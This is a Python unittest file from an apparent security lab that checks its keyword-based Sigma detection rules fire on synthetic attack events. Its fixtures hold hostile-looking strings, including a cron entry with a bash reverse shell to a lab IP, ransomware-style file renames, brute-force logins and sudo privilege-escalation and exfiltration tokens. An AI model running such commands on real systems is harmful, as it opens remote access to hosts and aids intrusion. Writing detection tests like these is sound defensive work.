"""
tests/test_sigma_rules.py -- Phase F10

Unit-test that each lab Sigma rule actually matches a synthetic event
the corresponding campaign would produce. Catches the regression class
where a rule's keyword list drifts and silently stops firing
(audit-2 Gap #7 was the cron-rule false-positive variant; this is the
inverse -- "rule never fires" instead of "rule always fires").

The lab's Sigma rules all use the same shape:

    detection:
        <selection_name>:
            - 'keyword 1'
            - 'keyword 2'
        ...
        condition: <selection_name> [and <selection_name> ...]

That's simpler than full Sigma -- no field selectors, no modifiers,
no nested logic. A 30-line evaluator covers it.
"""

from __future__ import annotations

import unittest
from pathlib import Path

import yaml

SIGMA_DIR = Path(__file__).parent.parent / "blue-team" / "detection" / "sigma"


def _selection_matches(selection: list[str] | dict, event: str) -> bool:
    """A selection list-of-keywords matches if any keyword is in event."""
    if isinstance(selection, dict):
        # Field-based selector -- not used by lab rules. Bail out cleanly
        # so the test is honest about scope.
        return False
    return any(kw.lower() in event.lower() for kw in selection)


def _rule_matches(rule: dict, event: str) -> bool:
    """
    Minimal evaluator for the lab's keyword-only Sigma rules. Parses
    `detection.<name>` selection lists and `detection.condition` (which
    is always `<name> [and <name> ...]` in our rules) and reports
    whether the event matches.
    """
    detection = rule["detection"]
    condition = detection["condition"]
    # Strip "(... | ... )" complexity if anyone ever adds it; lab rules
    # are simple "a and b" / "a" so the split below is robust enough.
    parts = [p.strip() for p in condition.split("and")]
    for sel_name in parts:
        sel = detection.get(sel_name)
        if sel is None:
            return False
        if not _selection_matches(sel, event):
            return False
    return True


def _load_rule(filename: str) -> dict:
    return yaml.safe_load((SIGMA_DIR / filename).read_text())


class TestMitmSigmaRule(unittest.TestCase):
    """Phase F10 anchor: the MITM rule that motivated this test."""

    def test_fires_on_synthetic_spoof_advisory(self) -> None:
        rule = _load_rule("mitm_arp_spoof.yml")
        event = (
            "arp_spoof_simulation event written to /tmp/lab_mitm.log: "
            "attacker_mac=02:AD:BE:EF:00:01 LAB-SIMULATION: attacker"
        )
        self.assertTrue(
            _rule_matches(rule, event),
            f"MITM Sigma rule should match synthetic event:\n  {event}",
        )

    def test_does_not_fire_on_benign_event(self) -> None:
        rule = _load_rule("mitm_arp_spoof.yml")
        event = "normal lab-net traffic; no spoof markers here"
        self.assertFalse(
            _rule_matches(rule, event),
            "MITM Sigma rule should NOT match benign event",
        )


class TestKeywordLabSigmaRulesFire(unittest.TestCase):
    """
    Subset of lab rules that use the simple keyword-list selection +
    `and` condition pattern. The minimal evaluator above covers exactly
    these. The other two lab rules (privesc_sudo with regex keywords +
    `or` condition, exfil_https with field selectors) get separate
    schema-only coverage below since a real matcher would require
    pySigma at full strength.
    """

    # (rule_filename, synthetic_event_that_should_fire)
    RULE_FIXTURES: list[tuple[str, str]] = [
        (
            "persistence_cron.yml",
            "crontab -e modification: */5 * * * * /tmp/lab_beacon.sh "
            "bash -i >& /dev/tcp/172.20.0.10/4444",
        ),
        (
            "mitm_arp_spoof.yml",
            "arp_spoof_simulation /tmp/lab_mitm.log attacker_mac",
        ),
        (
            "credential_access_brute_force.yml",
            "POST /login 401 Invalid credentials username=admin password=wrong",
        ),
        (
            "malware_drop_eicar.yml",
            "EICAR-STANDARD-ANTIVIRUS-TEST-FILE written to "
            "/tmp/lab_malware_drop.eicar X5O!P%@AP marker present",
        ),
        (
            "impact_ransomware.yml",
            "rename in /tmp/ransom-decoys: notes.txt -> notes.txt.locked, ransom_note.txt dropped",
        ),
    ]

    def test_each_rule_fires_on_its_representative_event(self) -> None:
        misses: list[str] = []
        for filename, event in self.RULE_FIXTURES:
            rule = _load_rule(filename)
            if not _rule_matches(rule, event):
                misses.append(f"{filename} did NOT match synthetic event:\n    {event}")
        self.assertFalse(
            misses,
            "Some Sigma rules failed to match the synthetic event the "
            "matching campaign produces:\n  - " + "\n  - ".join(misses),
        )


class TestAdvancedLabSigmaRulesSchema(unittest.TestCase):
    """
    Rules that use Sigma features our minimal evaluator doesn't cover
    (regex keywords, `or` conditions, field selectors with |contains /
    |gt / |endswith). For these we validate schema + presence of the
    keyword tokens we expect campaigns to produce, not actual matching.
    A full sigma-cli compile already happens in CI via
    scripts/setup/compile_sigma.sh -- that covers the "rule is well-
    formed" path.
    """

    ADVANCED_RULES: dict[str, list[str]] = {
        # rule_filename -> tokens we expect to find SOMEWHERE in the rule
        "privesc_sudo.yml": ["NOPASSWD", "find", "vim", "python3"],
        "exfil_https.yml": ["python-requests", ".onion", "c-cs-bytes"],
    }

    def test_advanced_rules_carry_expected_keyword_tokens(self) -> None:
        for filename, expected_tokens in self.ADVANCED_RULES.items():
            text = (SIGMA_DIR / filename).read_text()
            missing = [tok for tok in expected_tokens if tok not in text]
            self.assertFalse(
                missing,
                f"{filename} is missing expected tokens (rule may have "
                f"drifted away from its campaign): {missing}",
            )


class TestAllRulesHaveConditionBlock(unittest.TestCase):
    """Cheap structural sanity check across every Sigma rule."""

    def test_each_rule_has_a_condition_block(self) -> None:
        for path in sorted(SIGMA_DIR.glob("*.yml")):
            rule = yaml.safe_load(path.read_text())
            self.assertIn("detection", rule, f"{path.name} missing detection")
            self.assertIn(
                "condition",
                rule["detection"],
                f"{path.name} missing detection.condition",
            )


if __name__ == "__main__":
    unittest.main()
